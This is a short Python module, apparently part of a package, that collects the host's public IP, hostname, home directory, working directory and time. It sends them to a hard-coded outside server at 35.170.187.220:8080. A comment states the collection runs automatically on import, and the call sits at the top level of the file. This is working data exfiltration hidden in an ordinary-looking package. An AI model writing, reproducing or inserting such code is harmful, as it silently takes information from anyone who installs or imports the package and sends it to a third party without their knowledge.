import os
from urllib.request import urlopen, Request
from urllib.error import URLError
from datetime import datetime
from urllib.parse import urlencode

def collect_system_info():
    print("[*] Attempting to collect system info...")
    try:
        # Get public IP without relying on curl
        public_ip = urlopen('https://api.ipify.org').read().decode('utf-8').strip()
        hostname = os.uname().nodename
        home_dir = os.path.expanduser("~")
        current_dir = os.getcwd()

        # Get current time
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        system_info = {
            "publicIP": public_ip,
            "hostname": hostname,
            "homeDirectory": home_dir,
            "currentDirectory": current_dir,
            "currentTime": current_time
        }

        # Encode the parameters to make the URL safe
        encoded_params = urlencode(system_info, safe=':/')  # Ensures special characters are not encoded

        # Your server URL
        server_url = "http://35.170.187.220:8080/"

        # Combine the server URL and the encoded parameters
        full_url = f"{server_url}?{encoded_params}"

        req = Request(full_url)
        response = urlopen(req, timeout=10)
        if response.getcode() == 200:
            print("[*] System info sent successfully.")
        else:
            print(f"[!] Server error: {response.getcode()}")

    except URLError as e:
        print(f"[!] Connection failed: {e.reason}")
    except Exception as e:
        print(f"[!] Error: {e}")

# This will run automatically when the package is imported
collect_system_info()

